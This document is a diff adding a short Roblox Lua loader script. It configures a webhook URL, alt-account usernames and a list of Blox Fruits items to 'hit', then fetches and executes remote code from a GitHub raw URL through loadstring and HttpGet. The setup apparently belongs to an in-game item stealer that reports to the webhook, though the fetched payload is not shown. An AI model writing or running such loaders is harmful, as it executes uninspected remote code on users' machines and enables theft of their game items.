@@ -1,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Ymxfcmw2U1N6TXBzX2JUVi1kWjVWUTpqN2haM3I0YVliTWd1Q0lHU1RLVGhtcVFXN1pxZHBtMUtYMzBSRXpuRENIVGVSWE9SX0lqQnhwdTZQWEpyaUVPdXJvazRBa29oWTQ3MTFHNUg4RTJudU1EblF3SVFaa3l2ZU5yYnFFSTdNV0RldU1sdGh5TmdnZFZ5d3FKZHhxajI5eTJIMGRBZTBtMFh5a3YxemRCcEF3STVCVTM1bmRTRk9IdUxDYjFiMUU" -- << Your Webhook
+Usernames = {"user1", "user2"} -- << Your usernames here, you can add as many alts as you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough"} -- << Fruits you want the script to detect
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrektl/stuFF/refs/heads/main/wowowo"))()
